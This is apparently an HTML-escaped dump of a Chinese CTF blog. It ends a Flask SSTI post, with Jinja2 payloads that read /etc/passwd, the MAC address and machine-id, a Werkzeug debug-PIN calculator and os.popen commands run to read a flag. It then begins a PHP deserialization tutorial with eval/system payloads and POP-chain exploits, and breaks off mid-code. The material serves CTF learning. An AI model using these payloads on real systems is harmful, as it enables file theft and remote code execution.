isinstance(bit, str):        bit = bit.encode(&#x27;utf-8&#x27;)    h.update(bit)h.update(b&#x27;cookiesalt&#x27;) cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20] num = Noneif num is None:    h.update(b&#x27;pinsalt&#x27;)    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9] rv = Noneif rv is None:    for group_size in 5, 4, 3:        if len(num) % group_size == 0:            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)                          for x in range(0, len(num), group_size))            break        else:            rv = num print(rv)\n关于mac转换10进制脚本如下\ndef mac_to_decimal(mac_address):    hex_str = mac_address.replace(&quot;:&quot;, &quot;&quot;)    decimal = int(hex_str, 16)    return decimal# 示例mac = &quot;02:42:ac:10:ab:40&quot;result = mac_to_decimal(mac)print(result)  # 输出: 2485377870656\n对于Windows还原起来稍微麻烦，这里可以看一下现成的例题\n例题FlaskApp[GYCTF2020]FlaskApp - https://buuoj.cn/challenges#[GYCTF2020]FlaskApp首页直接就提示pin在解密页，随便输入点垃圾数据，就会弹出debug的报错，并且还可以看到他的部分源码发现他是先解密之后通过render_template_string(tmp)进行渲染，下面组装一个可以读取文件的payload，通过\n&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()&#125;&#125;e3snJy5fX2NsYXNzX18uX19iYXNlX18uX19zdWJjbGFzc2VzX18oKX19\n发现只要是运行__subclasses__()返回就是502，这里不和多废话，直接通过通用payload拿到他这个程序的源码\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignYXBwLnB5JywncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9\n拿到的源码(源码返回的是html编码，需要用赛博厨子解码一下)\nfrom flask import Flask, render_template_stringfrom flask import render_template, request, flash, redirect, url_forfrom flask_wtf import FlaskFormfrom wtforms import StringField, SubmitFieldfrom wtforms.validators import DataRequiredfrom flask_bootstrap import Bootstrapimport base64app = Flask(__name__)app.config[&quot;SECRET_KEY&quot;] = &quot;s_e_c_r_e_t_k_e_y&quot;bootstrap = Bootstrap(app)class NameForm(FlaskForm):    text = StringField(&quot;BASE64加密&quot;, validators=[DataRequired()])    submit = SubmitField(&quot;提交&quot;)class NameForm1(FlaskForm):    text = StringField(&quot;BASE64解密&quot;, validators=[DataRequired()])    submit = SubmitField(&quot;提交&quot;)    def waf(str):        black_list = [            &quot;flag&quot;,            &quot;os&quot;,            &quot;system&quot;,            &quot;popen&quot;,            &quot;import&quot;,            &quot;eval&quot;,            &quot;chr&quot;,            &quot;request&quot;,            &quot;subprocess&quot;,            &quot;commands&quot;,            &quot;socket&quot;,            &quot;hex&quot;,            &quot;base64&quot;,            &quot;*&quot;,            &quot;?&quot;,        ]        for x in black_list:            if x in str.lower():                return 1    @app.route(&quot;/hint&quot;, methods=[&quot;GET&quot;])    def hint():        txt = &quot;失败乃成功之母！！&quot;        return render_template(&quot;hint.html&quot;, txt=txt)    @app.route(&quot;/&quot;, methods=[&quot;POST&quot;, &quot;GET&quot;])    def encode():        if request.values.get(&quot;text&quot;):            text = request.values.get(&quot;text&quot;)            text_decode = base64.b64encode(text.encode())            tmp = &quot;结果 :&#123;0&#125;&quot;.format(str(text_decode.decode()))            res = render_template_string(tmp)            flash(tmp)            return redirect(url_for(&quot;encode&quot;))        else:            text = &quot;&quot;            form = NameForm(text)            return render_template(                &quot;index.html&quot;, form=form, method=&quot;加密&quot;, img=&quot;flask.png&quot;            )    @app.route(&quot;/decode&quot;, methods=[&quot;POST&quot;, &quot;GET&quot;])    def decode():        if request.values.get(&quot;text&quot;):            text = request.values.get(&quot;text&quot;)            text_decode = base64.b64decode(text.encode())            tmp = &quot;结果 ： &#123;0&#125;&quot;.format(text_decode.decode())            if waf(tmp):                flash(&quot;no no no !!&quot;)                return redirect(url_for(&quot;decode&quot;))            res = render_template_string(tmp)            flash(res)            return redirect(url_for(&quot;decode&quot;))        else:            text = &quot;&quot;            form = NameForm1(text)            return render_template(                &quot;index.html&quot;, form=form, method=&quot;解密&quot;, img=&quot;flask1.png&quot;            )    @app.route(&quot;/&lt;name&gt;&quot;, methods=[&quot;GET&quot;])    def not_found(name):        return render_template(&quot;404.html&quot;, name=name)if __name__ == &quot;__main__&quot;:    app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=True)\nwaf过滤一些内容，如下\nblack_list = [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;,&quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;,]\n其实这些单词还是比较容易绕过的，通过+拼接就没问题，甚至用进制的方式，这里可以通过下面的payload依次读取生成pin码所需要的数据\n# passwd 1000 flaskweb&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL2V0Yy9wYXNzd2QnLCdyJykucmVhZCgpIH19eyUgZW5kaWYgJX17JSBlbmRmb3IgJX0=# mac address 42:ca:61:23:36:1d&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/sys/class/net/eth0/address&#x27;,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3N5cy9jbGFzcy9uZXQvZXRoMC9hZGRyZXNzJywncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9# host id &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/machine-id&#x27;,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3Byb2Mvc2VsZi9jZ3JvdXAnLCdyJykucmVhZCgpIH19eyUgZW5kaWYgJX17JSBlbmRmb3IgJX0=# 读取cgroup发现不对，所以尝试machine-id 1408f836b0ca514d796cbf8960e45fa1\n除了固定的之外，在debug报错界面可以获取到app.py的绝对位置/usr/local/lib/python3.7/site-packages/flask/app.py跑一下脚本(老版本的这是)\nimport hashlibfrom itertools import chainprobably_public_bits = [    &quot;flaskweb&quot;  # username 可通过/etc/passwd获取    &quot;flask.app&quot;,  # modname默认值    &quot;Flask&quot;,  # 默认值 getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))    &quot;/usr/local/lib/python3.7/site-packages/flask/app.py&quot;,  # 路径 可报错得到  getattr(mod, &#x27;__file__&#x27;, None)]private_bits = [    &quot;73436980524573&quot;,  # /sys/class/net/eth0/address mac地址十进制    &quot;1408f836b0ca514d796cbf8960e45fa1&quot;,    # 字符串合并：首先读取文件内容 /etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id   /proc/self/cgroup    # 有machine-id 那就拼接machine-id + /proc/self/cgroup  否则 /proc/sys/kernel/random/boot_id + /proc/self/cgroup]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit = bit.encode(&quot;utf-8&quot;)    h.update(bit)h.update(b&quot;cookiesalt&quot;)cookie_name = &quot;__wzd&quot; + h.hexdigest()[:20]num = Noneif num is None:    h.update(b&quot;pinsalt&quot;)    num = (&quot;%09d&quot; % int(h.hexdigest(), 16))[:9]rv = Noneif rv is None:    for group_size in 5, 4, 3:        if len(num) % group_size == 0:            rv = &quot;-&quot;.join(                num[x : x + group_size].rjust(group_size, &quot;0&quot;)                for x in range(0, len(num), group_size)            )            break        else:            rv = numprint(rv)\n即594-730-022\n&gt;&gt;&gt; os.popen(&quot;cd /;ls &quot;).read()&#x27;app\\nbin\\nboot\\ndev\\netc\\nhome\\nlib\\nlib64\\nmedia\\nmnt\\nopt\\nproc\\nroot\\nrun\\nsbin\\nsrv\\nsys\\nthis_is_the_flag.txt\\ntmp\\nusr\\nvar\\n&#x27;  &gt;&gt;&gt; os.popen(&quot;pwd&quot;).read()&#x27;/app\\n&#x27;&gt;&gt;&gt; os.popen(&quot;cat /this_is_the_flag.txt&quot;).read()&#x27;flag&#123;d4aa5bbb-c2c7-4c02-b775-1ece8df35c88&#125;\\n&#x27;&gt;&gt;&gt; \n\n\n通杀工具-焚靖介绍项目地址： https://github.com/Marven11/Fenjing.gitSSTI大部分基础题目全都通杀\n安装pip install fenjing\n使用fenjing webui\n测试题目综合符号加数字过滤绕过\n","categories":["CTF相关","WEB"],"tags":["CTF","WEB","Python","Flask","SSTI"]},{"title":"WEB-PHP反序列化总结","url":"/2025/06/24/WEB-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/","content":"PHP中的类class Dog&#123;    var $name;    var $species = &quot;dog&quot;;    function call()    &#123;        echo &quot;woof woof&quot;;    &#125;&#125;\n上面定义了一个Dog类，并且他又两个成员变量，分别是name和species，然后还有一个成员方法call()，可以通过下面代码去创建和使用\n# 创建对象$dog1 = new Dog();# 给dog1设置name属性$dog1-&gt;name = &quot;luck&quot;;# 调用call方法$dog1-&gt;call();# 打印对象print_r($dog1);\n后续的，成员变量这里存在三种修饰符，用来管理访问权限的，分别是\n\npublic      默认的修饰符，他可以在任何位置使用，不受限制\nprotected 需要指定，他只能在类的内部、子类中可以使用，但是不能在类的外部使用\nprivate     私有的，只能在类的内部使用，在类的外部或者子类中都无法使用具体应用到上面代码中，具体如下\n\nclass Dog&#123;    public $name;    protected $color;    private $species = &quot;dog&quot;;        function call()    &#123;        echo &quot;woof woof&quot;;    &#125;&#125;\n此时我们如果想要去修改他的color和species或者读取的话都是会出问题，使用下面代码去验证\n$dog1 = new Dog();$dog1-&gt;name = &quot;luck&quot;;$dog1-&gt;color = &quot;black&quot;;$dog1-&gt;species = &quot;cat&quot;;print_r($dog1);\n当运行到修改color的时候，就会直接报错如果想要利用这俩外部不可调用的成员变量，需要在对应的位置添加调用代码，例如下面代码\nclass Dog&#123;    public $name;    protected $color;    private $species = &quot;dog&quot;;    function call()    &#123;        echo &quot;woof woof&quot;;    &#125;    function GeneMutation()    &#123;        $this-&gt;species = &quot;cat&quot;;    &#125;    function echoColor()    &#123;        echo $this-&gt;color;    &#125;    function echoSpecies()    &#123;        echo $this-&gt;species;    &#125;&#125;class Labrador extends Dog&#123;    function init()    &#123;        $this-&gt;color = &quot;golden&quot;;    &#125;&#125;\n增了一个一个拉布拉多的子类，初始化拉布拉多的时候给他的颜色修改成了golden，然后再Dog类中，增加了三个方法，输出颜色，输出种类还有一个基因突变，基因突变的方法直接修改了他的种类，测试运行代码如下\n$dog1 = new Dog();$dog1-&gt;name = &quot;luck&quot;;$dog1-&gt;GeneMutation();$dog1-&gt;echoColor();$dog1-&gt;echoSpecies();$dog2 = new Labrador();$dog2-&gt;name = &quot;luck2&quot;;$dog2-&gt;init();$dog2-&gt;echoColor();$dog2-&gt;echoSpecies();# 打印对象print_r($dog1);print_r($dog2);\n输出如下\ncatgoldendogDog Object(    [name] =&gt; luck    [color:protected] =&gt;     [species:Dog:private] =&gt; cat)Labrador Object(    [name] =&gt; luck2    [color:protected] =&gt; golden    [species:Dog:private] =&gt; dog)\n然后修饰符也可以修饰方法，这里不过多的去说，因为这里基本用不到。\n序列化基础序列化是把对象的状态信息转换成一个可以存储或者是可以传输的形式的过程。反序列化就是把序列化之后的内容再给恢复成对象。简单序列化案例,代码如下\n&lt;?phphighlight_file(__FILE__);class TEST &#123;    public $data;    public $data2 = &quot;dazzhuang&quot;;    private $pass;    public function __construct($data, $pass)    &#123;        $this-&gt;data = $data;        $this-&gt;pass = $pass;    &#125;&#125;$number = 34;$str = &#x27;user&#x27;;$bool = true;$null = NULL;$arr = array(&#x27;a&#x27; =&gt; 10, &#x27;b&#x27; =&gt; 200);$test = new TEST(&#x27;uu&#x27;, true);$test2 = new TEST(&#x27;uu&#x27;, true);$test2-&gt;data = &amp;$test2-&gt;data2;echo serialize($number).&quot;&lt;br /&gt;&quot;;echo serialize($str).&quot;&lt;br /&gt;&quot;;echo serialize($bool).&quot;&lt;br /&gt;&quot;;echo serialize($null).&quot;&lt;br /&gt;&quot;;echo serialize($arr).&quot;&lt;br /&gt;&quot;;echo serialize($test).&quot;&lt;br /&gt;&quot;;echo serialize($test2).&quot;&lt;br /&gt;&quot;;?&gt;\n最终输出内容如下对应的关系表格如下\n\n\n\n类型\n原始内容\n序列化后\n\n\n\n整形\n34\ni:34;\n\n\n字符串\nuser\ns:4:”user”; &#x2F;&#x2F; 4代表的是长度\n\n\n布尔\ntrue\nb:1;\n\n\n布尔\nflase\nb:0;\n\n\n空\nNULL\nN;\n\n\nArray\narray(‘a’ &#x3D;&gt; 10, ‘b’ &#x3D;&gt; 200);\na:2:{s:1:”a”;i:10;s:1:”b”;i:200;}  &#x2F;&#x2F; a:2 2代表的是数量 a代表的是array\n\n\nArray\narray(‘benben’,’dazhuang’,’laoliu’);\na:3:{i:0;s:6:”benben”;i:1;s:8:”dazhuang”;i:2;s:6:”laoliu”;} &#x2F;&#x2F;内容里面会有编号i:0 i:1 i:2\n\n\n\n\n\n\n\n\n\n\n\n\n关于对象的话，下面单独举个例子\n\n\n\n\nclass test&#123;    public $pub=&#x27;benben&#x27;;    function jineng()&#123;        echo $this-&gt;pub;    &#125;&#125;$a = new test();echo serialize($a);\ntest被序列化后返回的内容如下\nO:4:&quot;test&quot;:1:&#123;s:3:&quot;pub&quot;;s:6:&quot;benben&quot;;&#125;\n里面只会记录成员变量的内容，不会存在成员方法，因为序列化的这个动作只是为了记录状态的。再继续看一个案例，代码如下\nclass test&#123;    private $pub=&#x27;benben&#x27;;    function jineng()&#123;        echo $this-&gt;pub;    &#125;&#125;$a = new test();echo serialize($a);\ntest被反序列化后的内容如下这里的私有属性private $pub序列化之后变成了xtestxpub，这个xtestx就是用来表示私有属性的，中间的test代表属于test类中，一般这种的数据都会加一层url编码来搞，他的实际内容如下\nO%3A4%3A%22test%22%3A1%3A%7Bs%3A9%3A%22%00test%00pub%22%3Bs%3A6%3A%22benben%22%3B%7D\n实际中间的两个NULL就是%00。我们再看一下受保护的protected属性案例，代码如下\nclass test&#123;    protected $pub = &#x27;benben&#x27;;    function jineng()    &#123;        echo $this-&gt;pub;    &#125;&#125;$a = new test();echo urlencode(serialize($a));echo &quot;\\n&quot;;echo serialize($a);\n输出内容如下他和私有属性差不多，只是把类名字换成了*。再来一类的嵌套案例，代码如下\nclass test&#123;    var $pub=&#x27;benben&#x27;;    function jineng()&#123;        echo $this-&gt;pub;    &#125;&#125;class test2&#123;    var $ben;    function __construct()&#123;        $this-&gt;ben=new test();    &#125;&#125;$a = new test2();echo serialize($a);?&gt;\n返回内容如下\nO:5:&quot;test2&quot;:1:&#123;s:3:&quot;ben&quot;;O:4:&quot;test&quot;:1:&#123;s:3:&quot;pub&quot;;s:6:&quot;benben&quot;;&#125;&#125;\n嵌套的会直接把对应的类丢进去，这个还是比较好理解。\n漏洞利用下面来一道简单的题目来尝试利用一下这个反序列化的漏洞，例题代码如下\n&lt;?phphighlight_file(__FILE__);error_reporting(0);class test&#123;    public $a = &#x27;echo &quot;this is test!!&quot;;&#x27;;    public function displayVar() &#123;        eval($this-&gt;a);    &#125;&#125;$get = $_GET[&quot;benben&quot;];$b = unserialize($get);$b-&gt;displayVar() ;?&gt;\n这道题目里面有一个test类，然后存在一个可控的参数benben，他最终会被反序列化，并且反序列化之后的对象会去调用displayVar()这个方法。然后再displayVar方法中，里面是直接运行了一个eval，eval的内容是参数a的内容，我们这边只需要可以把a的内容进行控制，就可以实现任意代码执行的目的。构造的payload脚本如下\nclass test&#123;    public $a = &#x27;system(&quot;ls&quot;);&#x27;;&#125;$a = new test();echo (serialize($a));O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:13:&quot;system(&quot;ls&quot;);&quot;;&#125;\n结果如下\n魔术方法在序列化和反序列化的过程中，默认是不会调用方法的，但是有一部分内置的魔术方法，我一般都称为钩子函数，这部分钩子函数会在某些特定的时刻自动执行，包括序列化和反序列化的时候。还有一些会在特定的情况下自动触发，后面的题目基本都是围绕着这块来进行的，下面依次介绍一下经常用的魔术方法。\n__construct他是一个构造函数，在new(实例化)对象的时候会自动的去执行的一个方法，并且会把传入的参数也都丢给这个函数来处理，简单举个例子，代码如下\n&lt;?phpclass Dog&#123;    public $name;    public function __construct($name)    &#123;        $this-&gt;name = $name;        echo &quot;Dog $name is created.&quot;;    &#125;&#125;$test = new Dog(&quot;luck&quot;);\n此时运行代码会产生下面输出\nDog luck is created.\n__destruct他是析构函数，在对象的所有引用被删除或者当对象被显式销毁时执行的魔术方法。下面是案例\n&lt;?phpclass Dog&#123;    public $name;    public function __destruct()    &#123;        echo &quot;Dog $this-&gt;name is destroyed.\\n&quot;;    &#125;&#125;$test = new Dog(&quot;luck&quot;); $ser = serialize($test);unserialize($ser); //触发一次 - 显式销毁 反序列化之后没有直接使用// 结束后再次触发 - 隐式销毁\n输出如下\nDog  is destroyed.Dog  is destroyed.\n__sleep在序列化serialize的时候会检查是否存在当前魔术方法__sleep()，如果存在，该方法会先被调用，然后才执行序列化操作。此功能主要是用来清理对象，并且返回一个包含对象中所有应被序列化的变量名称的数组，如果他没有返回任何内容，则NULL被序列化并且会产生一个E_NOTICE级别的错误。下面看个例子\n&lt;?phphighlight_file(__FILE__);class User &#123;    const SITE = &#x27;uusama&#x27;;    public $username;    public $nickname;    private $password;    public function __construct($username, $nickname, $password)    &#123;        $this-&gt;username = $username;        $this-&gt;nickname = $nickname;        $this-&gt;password = $password;    &#125;    public function __sleep() &#123;        return array(&#x27;username&#x27;, &#x27;nickname&#x27;);    &#125;&#125;$user = new User(&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;);echo serialize($user);?&gt;\n他的返回值如下\nO:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;\n不要看他又很多的成员，但是他只会序列化sleep返回的成员名。下面看一道简单的例题\n&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    const SITE = &#x27;uusama&#x27;;    public $username;    public $nickname;    private $password;    public function __construct($username, $nickname, $password)    &#123;        $this-&gt;username = $username;        $this-&gt;nickname = $nickname;        $this-&gt;password = $password;    &#125;    public function __sleep() &#123;        system($this-&gt;username);    &#125;&#125;$cmd = $_GET[&#x27;benben&#x27;];$user = new User($cmd, &#x27;b&#x27;, &#x27;c&#x27;);echo serialize($user);?&gt;\nbenben直接传入命令即可\n__weakup在反序列化的时候unserialize()会检查是否存在一个__wakeup()的方法，如果存在则会先调用他，预先准备对象需要的资源。预先准备对象资源，返回void，常用于反序列化操作中的重新建立数据库连接，或者执行其他初始化内容。他非常重要，因为每次反序列化的时候都会优先触发，很多场景都是由她作为攻击的入口，还有一些特殊情况会通过这个函数给一些默认值，需要绕过，看下面简单代码\n&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    const SITE = &#x27;uusama&#x27;;    public $username;    public $nickname;    private $password;    private $order;    public function __wakeup() &#123;        $this-&gt;password = $this-&gt;username;    &#125;&#125;$user_ser = &#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;;var_dump(unserialize($user_ser));?&gt;\n返回内容如下\nobject(User)#1 (4) &#123; [&quot;username&quot;]=&gt; string(1) &quot;a&quot; [&quot;nickname&quot;]=&gt; string(1) &quot;b&quot; [&quot;password&quot;:&quot;User&quot;:private]=&gt; string(1) &quot;a&quot; [&quot;order&quot;:&quot;User&quot;:private]=&gt; NULL &#125;\n简单再去看一道例题，代码如下\n&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    const SITE = &#x27;uusama&#x27;;    public $username;    public $nickname;    private $password;    private $order;    public function __wakeup() &#123;        system($this-&gt;username);    &#125;&#125;$user_ser = $_GET[&#x27;benben&#x27;];unserialize($user_ser);?&gt;\n这里只需要传入username的数据即可，并且直接传入命令就行。\n__toString当实例化后的一个类被当作字符串去使用的时候就会触发，下面看一个示例代码\n&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    var $benben = &quot;this is test!!&quot;;         public function __toString()         &#123;             return &#x27;格式不对，输出不了!&#x27;;          &#125;&#125;$test = new User() ;print_r($test);echo &quot;&lt;br /&gt;&quot;;echo $test;?&gt;\n这里直接输出了实例化之后的User，他最终输出的内容是\nUser Object ( [benben] =&gt; this is test!! )格式不对，输出不了!\n他比较重要常用于构造pop链。\n__invoke当实例化后的一个类被当作函数去使用的时候就会触发，下面看一个示例代码\n&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    var $benben = &quot;this is test!!&quot;;         public function __invoke()         &#123;             echo  &#x27;它不是个函数!&#x27;;          &#125;&#125;$test = new User() ;echo $test -&gt;benben;echo &quot;&lt;br /&gt;&quot;;echo $test() -&gt;benben;?&gt;\n返回内容\nthis is test!!它不是个函数!\n这里是直接调用里面的benben这个成员变量当作一个函数去执行，他就触发了invoke。他比较重要常用于构造pop链。\n错误调用相关的魔术方法简单汇总一下，当错误调用一个不存在的方法的时候就会调用，传入的参数是两个，分别是调用的函数名字还有传入的参数，常见的可以参考下面代码\n__call&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    public function __call($arg1,$arg2)    &#123;        echo &quot;$arg1,$arg2[0]&quot;;          &#125;&#125;$test = new User() ;$test -&gt; callxxx(&#x27;a&#x27;);?&gt;\n里面没有任何成员方法的，这里如果直接去调用则会输出下面内容\ncallxxx,a\n__callStatic静态调用或者调用成员常量时候使用的方法不存在就会触发，传入的参数是两个，分别是调用的函数名字还有传入的参数，代码如下\n&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    public function __callStatic($arg1,$arg2)    &#123;        echo &quot;$arg1,$arg2[0]&quot;;          &#125;&#125;$test = new User() ;$test::callxxx(&#x27;a&#x27;);?&gt;\n他和__call意思差不多，只不过调用的方法是静态的主要区别就是::\n__get调用成员属性不存在的时候就会触发get，传入的参数就是被访问的不存在成员名，示例代码如下\n&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    public $var1;    public function __get($arg1)    &#123;        echo  $arg1;    &#125;&#125;$test = new User() ;$test -&gt;var2;?&gt;\n本身没有成员方法var2，此时输出如下\nvar2\n__set当给一个不存在的成员变量赋值的时候就会调用他，他传入的参数是被设置的成员名字和设置的数据，代码如下\n&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    public $var1;    public function __set($arg1 ,$arg2)    &#123;        echo  $arg1.&#x27;,&#x27;.$arg2;    &#125;&#125;$test = new User() ;$test -&gt;var2=1;?&gt;\n输出如下\nvar2,1\n\n__isset()当对不可访问的属性使用isset()或者empty()的时候，当前魔术方法就会被调用,传入的参数是一个当前使用的成员属性名称，示例代码如下\n&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    private $var;    public function __isset($arg1 )    &#123;        echo  $arg1;    &#125;&#125;$test = new User() ;isset($test-&gt;var);?&gt;\n输出如下\nvar\n__unset()当对不可访问的属性使用unset()的时候触发，传参是当前使用的成员变量名字，代码案例如下\n&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    private $var;    public function __unset($arg1 )    &#123;        echo  $arg1;    &#125;&#125;$test = new User() ;unset($test-&gt;var);?&gt;\n返回值如下\nvar\n__clone当使用clone关键字拷贝完成一个对象后，新对象会自动调用定义当前魔术方法，无传值。\n&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    private $var;    public function __clone( )    &#123;        echo  &quot;__clone test&quot;;          &#125;&#125;$test = new User() ;$newclass = clone($test)?&gt;\n输出如下\n__clone test\nPOP链构造前置例题1学习了魔术方法，我们可以简单看一道题目\n&lt;?phphighlight_file(__FILE__);error_reporting(0);class index &#123;    private $test;    public function __construct()&#123;        $this-&gt;test = new normal();    &#125;    public function __destruct()&#123;        $this-&gt;test-&gt;action();    &#125;&#125;class normal &#123;    public function action()&#123;        echo &quot;please attack me&quot;;    &#125;&#125;class evil &#123;    var $test2;    public function action()&#123;        eval($this-&gt;test2);    &#125;&#125;unserialize($_GET[&#x27;test&#x27;]);?&gt;\n这道题目会发现normal一点用没有，最终我们需要去触发evil-&gt;action方法，想要调用到这里需要index类的__destruct魔术方法，当前代码反序列化index的话会直接调用它，我们需要在意index-&gt;test的值，他如果是evil那就刚好可以触发，那我们最终的代码如下\n&lt;?phpclass index&#123;    private $test;    public function __construct()    &#123;        $this-&gt;test = new evil();    &#125;&#125;class evil&#123;    var $test2 = &quot;system(&#x27;ls&#x27;);&quot;;&#125;$a = new index();echo urlencode(serialize($a));// O%3A5%3A%22index%22%3A1%3A%7Bs%3A11%3A%22%00index%00test%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A5%3A%22test2%22%3Bs%3A13%3A%22system%28%27ls%27%29%3B%22%3B%7D%7D\n用上面payload会直接去执行system(&#39;ls&#39;);。\n前置例题2&lt;?phphighlight_file(__FILE__);error_reporting(0);class fast &#123;    public $source;    public function __wakeup()&#123;        echo &quot;wakeup is here!!&quot;;        echo  $this-&gt;source;    &#125;&#125;class sec &#123;    var $benben;    public function __tostring()&#123;        echo &quot;tostring is here!!&quot;;    &#125;&#125;$b = $_GET[&#x27;benben&#x27;];unserialize($b);?&gt;\n这道题目需要我们简单的构造一个链的触发形式，通过fast的wakeup-》sec–》tostring，解题脚本如下\n&lt;?phpclass fast&#123;    public $source;&#125;class sec&#123;    var $benben;&#125;$a = new fast();$a-&gt;source = new sec();echo urlencode(serialize($a)); // O%3A4%3A%22fast%22%3A1%3A%7Bs%3A6%3A%22source%22%3BO%3A3%3A%22sec%22%3A1%3A%7Bs%3A6%3A%22benben%22%3BN%3B%7D%7D\n什么是pop链？在反序列化中，我们能控制的数据就是对象中的属性值(成员变量)，所以在PHP反序列化中有一种漏洞利用方法叫面向属性编程，即POP(Property Oriented Programming)。POP链就是利用魔术方法在里面进行多次跳转然后获取敏感数据的一种payload。\npop链例题&lt;?php//flag is in flag.phphighlight_file(__FILE__);error_reporting(0);class Modifier &#123;    private $var;    public function append($value)    &#123;        include($value);        echo $flag;    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        echo $this-&gt;source;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123;    unserialize($_GET[&#x27;pop&#x27;]);&#125;?&gt;\n这个题目提供了多个类Modifier、Show、Test，我们最终的目的肯定是拿flag，在他这里flag输出是在Modifier类的append函数中，并且他在里头进行了一次文件包含，在文件的开头也提示了flag存储在flag.php中，然后我们想要触发这个函数需要被自身的__invoke调用，而__invoke需要当前类被当作函数调用，我们再看其他类中是否又调用Modifier-&gt;var的这种方法。目前得知的信息是需要触发Modifier-&gt;__invoke函数，然后var需要等于flag.php。当前构造的代码应该如下\n&lt;?phpclass Modifier&#123;    private $var = &quot;flag.php&quot;;&#125;$a = new Modifier();\n我们再继续看应该怎么触发__invoke函数，他需要一个类被当作函数调用才会触发，我们想办法找一下触发他的方法，在Test类的__get函数中发现了一个返回执行函数的内容return $function();他是通过this-&gt;p获取的方法，那我们这里可以把p修改成Modifier类。当前构造的代码应当如下\n&lt;?phpclass Modifier&#123;    private $var = &quot;flag.php&quot;;&#125;class Test&#123;    public $p;&#125;$a = new Modifier();$b = new 